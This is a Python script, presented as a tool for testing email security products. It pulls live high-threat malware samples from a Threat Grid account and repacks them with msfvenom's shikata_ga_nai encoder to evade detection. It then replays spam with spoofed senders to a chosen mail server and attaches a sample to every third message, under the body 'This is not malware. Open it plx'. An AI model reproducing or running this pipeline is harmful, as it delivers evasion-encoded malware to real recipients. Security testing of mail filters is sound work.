import argparse
import configparser
import os
from pathlib import Path
import random
import requests
import smtplib
from os.path import basename
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from email.utils import COMMASPACE, formatdate
import string
import subprocess
import sys
from xml.etree import ElementTree
from zipfile import ZipFile


parser = argparse.ArgumentParser(description='Send lots of spam and malware to test email security solutions.')
parser.add_argument('configfile', metavar='c', type=str, nargs='+',
                   help='Path to the configuration file.')

if len(sys.argv) > 2:
    print('We only accept one argument here...')
    sys.exit()

if len(sys.argv) < 2:
    print('You need to specify the path to the configuration file.')
    sys.exit()

config_file = sys.argv[1]

if not os.path.exists(config_file):
    print('The configuration file path specified does not exist.')
    sys.exit()

config = configparser.ConfigParser()
config.read(config_file)

spam_folder = str(config['Paths and Files']['spam_folder'])
msg_recipient = str(config['Strings']['msg_recipient'])
body = str(config['Strings']['body'])
receiving_mta = str(config['Domains']['receiving_mta'])
malware_folder = str(config['Paths and Files']['malware_folder'])
refresh_malware = config.getboolean('Booleans', 'refresh_malware') 
tg_domain = str(config['Domains']['tg_domain'])
tg_api_key = str(config['Paths and Files']['tg_api_key'])
malware_count = int(config['Integers']['malware_count'])
msg_limit = int(config['Integers']['msg_limit'])

def replaced(mode, sequence, old, new):
    if mode == 'startswith':
        return (new if x.startswith(old) else x for x in sequence)

    if mode == 'in':
        return (new if old in x else x for x in sequence)


def list_to_string(s):
    str1 = ""
    for ele in s:
        str1 += ele

    return str1


def get_random_string(stringLength=8):
    letters = string.ascii_lowercase
    
    return ''.join(random.choice(letters) for i in range(stringLength))


def malware_refresh(tg_api_key, tg_domain, malware_count):
    home = str(Path.home())
    try:
        with open(tg_api_key, 'r') as file:
          tg_api_key = file.read().replace('\n', '')

    except FileNotFoundError:
        print("API Key File Was Not Found")
        tg_api_key = input("Enter your Threat Grid API Key: ")

    tg_url = 'https://' + tg_domain + '/api/v2/search/submissions'
    tg_artifact_url = 'https://' + tg_domain + '/api/v2/samples/{}/sample.zip'
    tg_parameters = {'api_key': tg_api_key,
                     'advanced':'true',
                     'state':'succ',
                     'q':'analysis.threat_score:100',
                     'sort_by':'submitted_at',
                     'sort_order':'desc'}

    request = requests.get(tg_url, params=tg_parameters)
    json_response = request.json()

    for i in range(0,malware_count):
        sampleid = json_response['data']['items'][i]['item']['sample']
        print('Using Sample ID: '+sampleid)
        tg_download_parameters = {'api_key': tg_api_key}
        request = requests.get(tg_artifact_url.format(sampleid), params = tg_download_parameters)
        sampleid_value_zip = sampleid + '.zip'
        open(sampleid_value_zip, 'wb').write(request.content)
        
        with ZipFile(sampleid_value_zip, 'r') as zipObj:
            filenames = zipObj.namelist()
            zipObj.extractall(pwd=b'infected')

        filename = list_to_string(filenames)

        os.rename(filename, filename + ".exe")
        print('Repacking File: ' + filename)
        payloadname = get_random_string()
        print('Calling msfvenom with filesname ' + payloadname + '.exe')
        try:
            subprocess.call(['msfvenom p generic/custom PAYLOADFILE-' + filename + '.exe -a x86 --platform windows -e x86/shikata_ga_nai -f exe -o ' + malware_folder + '/' + payloadname +'.exe'], shell=True)
        except Exception as e:
            print('Something went wrong when we asked MSFVenom to repack our malware. Is your install complete?\n' + e)

def send_malware(sender, msg_recipient, subject, malware, receiving_mta):
     message = MIMEMultipart()
     message["From"] = sender
     message["To"] = msg_recipient
     message["Subject"] = subject
     body = "This is not malware. Open it plx"
     message.attach(MIMEText(body, "plain"))

     with open(malware, "rb") as attachment:
         part = MIMEBase("application", "octet-stream")
         part.set_payload(attachment.read())

     encoders.encode_base64(part)
     part.add_header(
         "Content-Disposition",
         f"attachment; filename= {malware.split('/')[1]}",
        )

     message.attach(part)
     text = message.as_string()
     with smtplib.SMTP(receiving_mta) as server:
         server.sendmail(sender, msg_recipient, text)


def fire(msg_limit):
    msg_count = 1
    failed_count = 0
    for spam in os.listdir(spam_folder):
        with open(spam_folder + '/' + spam, encoding = "ISO-8859-1") as m:
            try:
                lines = m.readlines()
                with open('message.current', 'w') as f:
                    msg = replaced('startswith', lines, 'To: ', 'To: ' + msg_recipient + '\n')
                    f.write("".join(msg))
                    for line in lines:
                        if 'From: ' in line:
                            try:
                                sender = line.split(':')[1]
                                sender = sender.split('<')[1]
                                sender = sender.split('>')[0]
                            except Exception as e:
                                print('Failed: ' + e)
                                failed_count = failed_count + 1
                                continue
                        if 'Subject: ' in line:
                            try:
                                subject = line.split(':')[1]
                            except Exception as e:
                                print('Failed: ' + e)
                                failed_count = failed_count + 1
                                continue

            except Exception as e:
                print('Failed: ' + e)
                failed_count = failed_count + 1
                continue

            with open('message.current', 'r') as f:
                msg = f.read()
                smtpObj = smtplib.SMTP(receiving_mta)
                try:
                    if not (msg_count % 3 == 0):
                        print('Sending message ' + str(msg_count) + ' of ' + str(msg_limit))
                    elif (msg_count % 3 == 0):
                        malware = random.choice(os.listdir(malware_folder + '/'))
                        print('Attaching malware file ' + malware + ' to message: ' + subject)
                        send_malware(sender, msg_recipient, subject, malware_folder + '/' + malware, receiving_mta)
                except Exception as e:
                    print(e)
                msg_count = msg_count + 1
                if msg_count == msg_limit:
                    print('Messages sent: ' + str(msg_count) + '\nFailed: ' + str(failed_count))
                    sys.exit()


if __name__ == '__main__':
    if refresh_malware:
        malware_refresh(tg_api_key, tg_domain, malware_count)
    fire(msg_limit)
